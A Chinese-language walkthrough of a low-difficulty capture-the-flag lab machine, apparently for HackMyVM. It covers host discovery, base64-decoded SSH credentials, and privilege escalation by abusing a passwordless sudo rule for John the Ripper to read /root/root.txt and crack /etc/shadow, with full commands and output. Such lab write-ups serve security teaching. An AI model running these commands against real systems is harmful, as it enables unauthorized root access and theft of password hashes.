### 1. 简介

- 靶机名称: JuMo (未发布，内部测试靶机，可能后续发布于 HackMyVm)
- 难度: 低 (Low)
- 目标 IP: 192.168.205.182 (通过 arp-scan 发现)
- 攻击机 IP: 192.168.205.128
- 目标: 获取目标系统的 root 权限并找到 flag。

### 2. 信息收集 (Enumeration)

#### 2.1. 主机发现

首先，使用 arp-scan 在本地网络中发现目标主机的 IP 地址。

```bash
┌──(kali㉿kali)-[~/test]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
# ... (其他输出) ...
192.168.205.182 08:00:27:ff:bf:ce       PCS Systemtechnik GmbH #<-- 目标主机
# ... (其他输出) ...
Ending arp-scan 1.10.0: 256 hosts scanned in 2.033 seconds (125.92 hosts/sec). 4 responded
```

确认目标 IP 为 192.168.205.182。

#### 2.2. 端口扫描

使用 nmap 对目标主机进行全端口扫描，以识别开放的服务。

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -p- 192.168.205.182
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-11 08:46 CST
Nmap scan report for 192.168.205.182
Host is up (0.00022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh     #<-- SSH 服务开放
80/tcp open  http    #<-- HTTP 服务开放
MAC Address: 08:00:27:FF:BF:CE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
```

扫描结果显示目标开放了 22 (SSH) 和 80 (HTTP) 端口。

### 3. 获取初始访问权限 (Initial Foothold)

#### 3.1. Web 服务探测

访问目标主机的 80 端口（ http://192.168.205.182 ）。

![image-20250411084817446](https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411084824566.png)

这个提示我们在 hackmyvm 平台上查找一个名为 check 的用户。

#### 3.2. 信息挖掘

在 HackMyVm 网站上搜索用户 check。

![image-20250411085044849](https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411085044939.png)

找到了该用户的个人资料，其中包含一个外部链接。访问该链接：

![image-20250411085314126](https://hub.gitmirror.com/https://github.com/7r1UMPH/7r1UMPH.github.io/blob/main//static/image/20250411085314150.png)

页面上有一串 Base64 编码的字符串 d2VsY29tZTpqdW1v。对其进行解码：

```bash
┌──(kali㉿kali)-[~/test]
└─$ echo 'd2VsY29tZTpqdW1v' | base64 -d
welcome:jumo
```

解码后得到 welcome:jumo，这很可能是一对 SSH 登录凭据（用户名:密码）。

#### 3.3. SSH 登录

使用获取到的凭据尝试 SSH 登录：

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh welcome@192.168.205.182
# ...(SSH 连接确认)...
Password: # 输入密码 jumo
Linux JuMo 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64
# ... (欢迎信息) ...
welcome@JuMo:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

成功以 welcome 用户身份登录系统。

### 4. 权限提升 (Privilege Escalation)

#### 4.1. Sudo 权限检查

检查 welcome 用户拥有的 sudo 权限：

```bash
welcome@JuMo:~$ sudo -l
Matching Defaults entries for welcome on JuMo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on JuMo:
    (ALL : ALL) NOPASSWD: /usr/sbin/john   #<-- 可以免密以 root 权限执行 john
```

输出显示 welcome 用户可以无需密码 (NOPASSWD) 以任何用户 (ALL:ALL) 的身份执行 /usr/sbin/john 命令。john (John the Ripper) 是一个密码破解工具。

#### 4.2. 利用 Sudo 权限

由于可以以 root 身份执行 john，并且 /root 目录下的文件通常只有 root 用户可读，我们可以尝试利用 john 读取 /root 目录下的文件。

方法一：直接读取可能的 Flag 文件 (我的方法)

我已知 /root/root.txt 包含了 flag。虽然 john 的 --wordlist 选项通常用于指定密码字典，但配合 --stdout 选项，john 会将 wordlist 的内容（或生成的候选密码）打印到标准输出。利用 sudo 权限，这可以用来读取 root 权限才能访问的文件内容。

```bash
welcome@JuMo:~$ sudo /usr/sbin/john --wordlist=/root/root.txt --stdout
Press 'q' or Ctrl-C to abort, almost any other key for status
flag{521ca933d6e159a50c2c04e7daa930f6}  #<-- 读取并输出了 /root/root.txt 的内容
1p 0:00:00:00 100% 100.0p/s flag{521ca933d6e159a50c2c04e7daa930f6}
```

此命令成功读取了 /root/root.txt 文件，内容即为 flag。

方法二：破解 Root 密码 (ta0神的方法)

更常见的利用 john 进行提权的方式是破解 /etc/shadow 文件中的密码哈希。这里假设 /root/root.txt 文件恰好包含了 root 用户的密码（或者可以直接作为字典）。

```bash
welcome@JuMo:~$ sudo /usr/sbin/john /etc/shadow --wordlist=/root/root.txt
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 100% 0g/s 100.0p/s 200.0c/s 200.0C/s flag{521ca933d6e159a50c2c04e7daa930f6} #<-- 破解出的 root 密码
Session completed
```

john 成功利用 /root/root.txt 的内容（即 flag）作为字典，破解了 /etc/shadow 文件中的 root 用户密码哈希。破解得到的 root 密码正是 flag{521ca933d6e159a50c2c04e7daa930f6}。

#### 4.3. 获取 Root 权限

根据群主提示我们可知root密码为root flag

```bash
welcome@JuMo:~$ su -
Password: # 输入 521ca933d6e159a50c2c04e7daa930f6
root@JuMo:~# id
uid=0(root) gid=0(root) groups=0(root)
root@JuMo:~# cat /root/root.txt
flag{521ca933d6e159a50c2c04e7daa930f6}
```

成功获取 root 权限。最终的 flag 存储在 /root/root.txt 中。

### 5. 总结

本次渗透测试通过以下步骤完成：

1. 信息收集: 使用 arp-scan 和 nmap 发现目标主机及其开放的 SSH 和 HTTP 服务。
2. 初始访问: 分析网页源代码，发现指向 HackMyVm 用户 check 的线索，进而找到其外部链接中的 Base64 编码凭据，成功通过 SSH 登录 welcome 用户。
3. 权限提升: 发现 welcome 用户可通过 sudo 免密执行 john 命令。利用此权限，通过 john --wordlist=/root/root.txt --stdout 直接读取了 /root/root.txt 中的 flag，或者通过 john /etc/shadow --wordlist=/root/root.txt 破解出 root 密码（密码恰好是 flag），最终使用 su 命令切换到 root 用户。

靶机设计巧妙，利用了信息泄露和 sudo 配置不当的漏洞，难度符合 Low 级别。